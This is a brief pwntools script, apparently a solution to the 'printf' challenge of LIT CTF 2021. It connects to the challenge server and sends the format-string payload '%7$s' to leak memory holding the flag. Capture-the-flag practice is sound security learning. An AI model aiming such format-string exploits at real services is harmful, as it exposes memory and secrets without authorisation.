from pwn import *

#init

e = ELF('./printf')

#p = process(e.path)
p = remote('printf.lit-ctf-2021-2-codelab.kctf.cloud', 1337)

#exploit

p.sendlineafter('?', '%7$s')

#pray for flag

p.interactive()
